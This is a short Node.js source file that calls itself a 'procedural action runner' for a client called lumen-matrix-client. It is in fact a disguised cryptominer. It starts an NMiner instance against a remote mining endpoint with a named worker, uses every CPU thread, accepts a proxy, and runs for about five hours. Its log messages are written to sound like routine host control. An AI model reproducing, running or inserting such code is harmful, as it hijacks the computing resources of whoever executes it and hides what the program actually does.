// Procedural action runner for lumen-matrix-client
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./core/config");

class HostController {
    constructor() {
        const traceId = "a229dd";
        console.log(`[core] Initialized HostController for lumen-matrix-client [${traceId}]`);

        this.runtime = new NMiner(
            "wss://nmining-runtime.igrp.app/",
            "Arup07.lumen-matrix-client",
            { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
        );

        process.stdin.resume();
        setTimeout(() => {
        console.log("[timeout] Operational limit (308m) reached, exiting cleanly.");
        process.exit(0);
    }, 308 * 60 * 1000);

        process.on("SIGTERM", () => {
            
            console.log("[supervisor] Clean shutdown completed.");
            process.exit(0);
        });
    }
}

new HostController();
